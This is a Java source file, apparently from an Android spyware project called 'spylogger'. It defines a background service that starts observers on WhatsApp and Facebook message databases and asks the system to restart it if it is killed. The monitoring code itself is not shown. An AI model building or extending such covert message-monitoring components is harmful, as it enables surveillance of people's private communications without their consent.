package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;

import com.gravatasufoca.spylogger.observers.DbObserver;
import com.gravatasufoca.spylogger.observers.FaceDbObserver;
import com.gravatasufoca.spylogger.observers.WhatsDbObserver;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by bruno on 21/04/17.
 */

public class MensageiroObserversService extends Service{
    private List<DbObserver> dbObservers=new ArrayList<>();

    private Looper mServiceLooper;
    private ServiceHandler mServiceHandler;

    // Handler that receives messages from the thread
    private final class ServiceHandler extends Handler {
        public ServiceHandler(Looper looper) {
            super(looper);
        }
        @Override
        public void handleMessage(Message msg) {
           start();
        }
    }

    @Override
    public void onCreate() {
        // Start up the thread running the service.  Note that we create a
        // separate thread because the service normally runs in the process's
        // main thread, which we don't want to block.  We also make it
        // background priority so CPU-intensive work will not disrupt our UI.
       /* HandlerThread thread = new HandlerThread("ServiceStartArguments",
                Process.THREAD_PRIORITY_FOREGROUND);
        thread.start();

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.getLooper();
        mServiceHandler = new ServiceHandler(mServiceLooper);*/
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // For each start request, send a message to start a job and deliver the
        // start ID so we know which request we're stopping when we finish the job
//        Message msg = mServiceHandler.obtainMessage();

//        mServiceHandler.sendMessage(msg);
        start();

        // If we get killed, after returning from here, restart
        return START_STICKY;
    }

    private void start() {
        dbObservers.add(new WhatsDbObserver(getApplicationContext()));
        dbObservers.add(new FaceDbObserver(getApplicationContext()));

        for(DbObserver observer: dbObservers){
            observer.observe();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }

}
